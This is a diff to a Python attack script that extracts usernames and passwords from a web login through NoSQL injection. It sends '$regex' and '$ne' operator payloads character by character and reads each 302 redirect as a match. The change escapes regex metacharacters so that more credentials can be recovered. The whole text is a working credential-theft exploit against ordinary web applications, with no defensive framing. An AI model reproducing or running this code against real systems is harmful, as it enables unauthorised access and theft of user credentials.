@@ -21,21 +21,27 @@ def findUsernames():
     while True:
         hit = False
         for c in string.printable:
-            if c not in ['*','+','.','?','|', '&', '$', '^']:
-                payload='username[$regex]=^%s&password[$ne]=nopes' % (urllib.quote_plus(username + c))
-                clear()
-                print("Scouting Username: " + username + c)
-                r = requests.post(url, data = payload, headers = headers, verify = False, allow_redirects = False)
-                if r.status_code == 302:
-                    ex = False
-                    if username == "":
-                        for user in users.keys():
-                            if c == user[0]:
-                                ex = True
-                    if ex:
-                        continue
-                    username += c
-                    hit = True
+            special = False
+            if c in ['*','+','.','?','|', '$', '^', '#']:
+                orig = c
+                c = "\\" + c
+                special = True
+            payload='username[$regex]=^%s&password[$ne]=nopes' % (urllib.quote_plus(username + c))
+            clear()
+            print("Scouting Username: " + username + c)
+            r = requests.post(url, data = payload, headers = headers, verify = False, allow_redirects = False)
+            if r.status_code == 302:
+                ex = False
+                if username == "":
+                    for user in users.keys():
+                        if c == user[0]:
+                            ex = True
+                if ex:
+                    continue
+                if special:
+                    c = orig
+                username += c
+                hit = True
         if not hit:
             if username == "":
                 break
@@ -52,14 +58,20 @@ def findPasswords():
         while True:
             hit = False
             for c in string.printable:
-                if c not in ['*','+','.','?','|', '#', '&', '$', '^']:
-                    payload='username=%s&password[$regex]=^%s' % (urllib.quote_plus(user), urllib.quote_plus(password + c))
-                    clear()
-                    print("Username: " + user +" Password: " + password + c)
-                    r = requests.post(url, data = payload, headers = headers, verify = False, allow_redirects = False)
-                    if r.status_code == 302:
-                        password += c
-                        hit = True
+                special = False
+                if c in ['*','+','.','?','|', '$', '^', '#']:
+                    orig = c
+                    c = "\\" + c
+                    special = True
+                payload='username=%s&password[$regex]=^%s' % (urllib.quote_plus(user), urllib.quote_plus(password + c))
+                clear()
+                print("Username: " + user +" Password: " + password + c)
+                r = requests.post(url, data = payload, headers = headers, verify = False, allow_redirects = False)
+                if r.status_code == 302:
+                    if special:
+                        c = orig
+                    password += c
+                    hit = True
             if not hit:
                 users[user]['password'] = password
                 break
